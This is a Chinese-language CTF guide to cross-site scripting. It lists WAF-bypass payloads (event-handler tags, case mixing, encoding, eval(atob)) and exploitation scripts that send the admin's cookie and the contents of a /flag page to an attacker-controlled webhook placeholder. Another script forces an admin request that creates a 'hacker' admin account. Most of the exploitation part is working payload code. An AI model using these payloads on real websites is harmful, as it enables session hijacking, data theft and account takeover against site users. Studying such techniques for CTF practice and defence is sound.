# 跨站脚本 (XSS) 与客户端安全指南

在 CTF 题目中，如果发现页面有“管理员查看”、“提交反馈给 Admin” 或使用了 Headless Browser（如 Puppeteer/Selenium）在后端渲染页面的提示，极大可能考察的是 XSS 或 CSRF。

**核心目标**: 利用 XSS 执行 JavaScript，窃取 Admin 的 Cookie (Flag)，或者让 Admin 在内网环境中发起请求 (SSRF in Client)。

## 1. 发现与验证 XSS

- 寻找输入并能反射在页面上的点（URL 参数、留言板、用户名、个人简介）。
- **闭合标签**: 观察输入点处于 HTML 的什么位置。
  - 在标签内容中：直接输入 `<script>alert(1)</script>` 或 `<img src=x onerror=alert(1)>`。
  - 在属性中 (`<input value="HERE">`)：先闭合属性 `"><script>alert(1)</script>`，或者利用事件 `" autofocus onfocus="alert(1)`。
  - 在 `<script>` 块中：尝试闭合 `</script>` 或使用逻辑闭合如 `';alert(1);//`。

## 2. WAF 绕过技巧 (Bypass)

CTF 中的 XSS 通常伴随严格的过滤，不要只用简单的 Payload。

1. **关键字绕过**:
   - 尝试大小写混写：`<sCrIpt>`
   - 双写绕过（如果只过滤一次）：`<scr<script>ipt>`
2. **无 `<script>` 标签**:
   - 利用 `<img>`，`<svg>`，`<details>`，`<body>` 等标签的事件：
     - `<svg/onload=alert(1)>`
     - `<body onload=alert(1)>`
     - `<details open ontoggle=alert(1)>`
3. **过滤空格**:
   - 使用 `/` 替代：`<img/src=x/onerror=alert(1)>`
4. **过滤括号 `()`**:
   - 使用反引号代替：`alert`1`` (注意：有时不起作用，可使用 `setTimeout` 变体)。
   - 使用 `onerror=location='javascript:alert%281%29'`。
5. **编码混淆**:
   - 实体编码：将部分字符转换为 HTML 实体（如 `&#x3C;` 代替 `<`）。
   - URL 编码。
   - `eval(atob('...'))` 或 `eval(String.fromCharCode(...))`。

## 3. 构造利用链 (Exploitation)

在确认存在 XSS 后，编写 Payload 窃取数据。由于你无法直接收到 Admin 的请求，你需要使用 Python 开启一个临时的 Webhook 服务器，或者利用免费的 Webhook.site 服务接收数据。

**1. 窃取 Cookie**:
```javascript
// Payload
<script>
  var img = new Image();
  img.src = 'http://你的IP或Webhook地址/log?c=' + btoa(document.cookie);
</script>
```

**2. 读取页面源码 (如只有 Admin 能看到的 /flag 页面)**:
```javascript
<script>
  fetch('/flag').then(res => res.text()).then(data => {
    fetch('http://你的IP或Webhook地址/log', {
      method: 'POST',
      body: data
    });
  });
</script>
```

**3. 执行敏感操作 (类似 CSRF)**:
如果需要 Admin 权限修改某个密码或添加用户：
```javascript
<script>
  fetch('/admin/add_user', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'username=hacker&role=admin'
  });
</script>
```

## 4. XSS to RCE (SSTI / Template Injection)

如果你发现输入的内容被某些模板引擎（如 Jinja2, Twig, Smarty）原样输出了，这可能不是 XSS，而是服务端模板注入 (SSTI)！
- 测试 `{{ 7*7 }}`。如果输出 49，立即转向 SSTI 漏洞利用，尝试读取配置或执行系统命令。